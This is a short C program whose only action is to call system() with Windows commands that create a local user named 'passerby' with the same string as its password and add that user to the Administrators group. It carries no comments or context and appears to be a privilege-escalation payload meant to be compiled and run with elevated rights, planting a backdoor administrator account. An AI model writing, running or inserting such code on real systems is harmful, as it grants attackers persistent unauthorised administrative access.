#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user passerby passerby /add && net localgroup administrators passerby /add");
  return 0;
}
